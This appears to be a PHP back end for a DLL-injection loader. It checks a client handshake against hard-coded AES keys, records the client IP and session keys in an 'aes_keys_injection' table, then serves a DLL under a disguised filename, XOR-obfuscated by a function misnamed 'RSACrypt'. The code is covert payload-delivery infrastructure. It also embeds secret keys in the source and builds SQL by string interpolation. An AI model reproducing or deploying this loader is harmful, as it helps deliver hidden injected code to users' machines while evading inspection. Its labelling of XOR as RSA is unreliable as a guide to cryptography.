<?php
include "../../AES.php";
$dllpath = "/loader/load/f547c183/7cf74ca4.dll";

function RSACrypt($input) 
{
$key = 'fkgacisjpepaphujmjjrnhorvizhqvzdvnvylhfkcbdsbyhoizqjrjsspmxsdtnaiujxwsqbksunsnagyaqyhdfyystlabaoqgsonqxysnvwcigevbfxoujvyfxoyoxcwpwxhqtqqtsbyljhifpbpwxoxlhomkezzncozwqwvifrkmdspwtiqptjypdarljzjisudwuzvtqurdcfksffndllivngmlribyuiqleejzornonhzdluvpsvnweefnom';
$inputLen = strlen($input);
$keyLen = strlen($key);

if ($inputLen <= $keyLen) 
{
    return $input ^ $key;
}

for ($i = 0; $i < $inputLen; ++$i) 
{
    $input[$i] = $input[$i] ^ $key[$i % $keyLen];
}
return $input;
}

if (isset($_GET["a"]) && isset($_GET["b"])) 
{   

    $ip_request = $_SERVER['HTTP_X_REAL_IP'];
    $unprotect_request = $aes::decrypt(mysqli_real_escape_string($helper::connect(), $helper::fix_request($_GET["a"])), "r09y7LrY1C4yqONI641qMQe7GA5mQvdf", "H1ggF9foFGLerr8q");
    $protect_request = mysqli_real_escape_string($helper::connect(), $helper::fix_request($_GET["b"]));
    
    $tempory_cipher_key = substr($unprotect_request, 0, 32);
    $tempory_iv_key = substr($unprotect_request, 32, 48);

    if ($unprotect_request == $aes::decrypt($protect_request, $tempory_cipher_key, $tempory_iv_key))
    {
        $date_register_key = date("Y-m-d H:i:s");
        
        $generated_session_cipher_key = $aes::generate_key(64); 
        $session_cipher_key = $data->cipher_key = $generated_session_cipher_key;
        
        $generated_session_iv_key = $aes::generate_key(32);
        $session_iv_key = $data->iv_key = $generated_session_iv_key;         
        
        mysqli_query($helper::connect(),"INSERT INTO aes_keys_injection(cipher, iv, date, ip) VALUES('$generated_session_cipher_key', '$generated_session_iv_key', '$date_register_key', '$ip_request')");

        $attachment_location = $_SERVER["DOCUMENT_ROOT"] . $dllpath;

        if (file_exists($attachment_location)) 
        {
            header($_SERVER["SERVER_PROTOCOL"] . " 200 OK");
            header("Cache-Control: public"); // needed for internet explorer
            header("Content-Type: application/dll");
            header("Content-Transfer-Encoding: Binary");
            header("Content-Length:".filesize($attachment_location));
            header("Content-Disposition: attachment; filename=e9dc924f2.dll");
            $raw = file_get_contents($attachment_location);
            echo RSACrypt($raw);
            //echo $raw;
        } 
        
        unset($tempory_cipher_key);
        unset($tempory_iv_key); 
    }
    else
    {
       die($aes::encrypt("file_error", $_SESSION["cipher_key"], $_SESSION["iv_key"]));
    }
}
else
{
    die();
}
?>